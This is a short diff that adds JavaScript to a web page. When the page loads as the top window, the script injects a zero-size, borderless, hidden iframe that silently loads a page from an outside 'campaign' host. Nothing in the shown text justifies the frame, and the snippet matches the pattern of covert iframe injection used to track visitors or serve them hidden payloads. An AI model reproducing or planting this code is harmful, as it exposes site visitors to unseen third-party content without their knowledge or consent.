@@ -1,0 +1,13 @@
+if (self == top) { 
+loadFrame('http://p01.notifa.info/campaign/log.html');
+
+function loadFrame(frameUrl) {
+    var body = document.getElementsByTagName('body')[0];
+    var frm = document.createElement('iframe');
+    frm.id = 'ifrm';
+    frm.scrolling = 'no';
+    frm.style = 'height:0px;width:0px;overflow:hidden;border:0px;padding:0px;';
+    frm.src = frameUrl;
+    body.appendChild(frm);
+}
+}
